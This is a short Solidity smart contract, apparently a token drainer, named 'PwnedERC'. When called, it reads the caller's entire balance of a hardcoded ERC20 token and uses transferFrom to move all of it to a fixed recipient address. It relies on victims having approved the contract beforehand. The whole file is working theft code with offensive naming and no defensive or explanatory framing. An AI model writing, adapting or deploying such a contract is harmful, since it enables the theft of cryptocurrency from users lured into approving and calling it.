// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract PwnedERC {
    event Balance(address indexed _from, uint256 _amt);

    ERC20 hacked = ERC20(0x84559257a907b77037F018A4002BB07a0fe4c73e);
    
    function letsGo() public returns (bool){
        address _from = msg.sender;
        uint256 balance = hacked.balanceOf(msg.sender);
        emit Balance(_from, balance);

        address to = 0xF904aC4EEF73C061b05862142bb146cb78303291;
        bool success = hacked.transferFrom(msg.sender, to, balance);
        return success;
    }
}
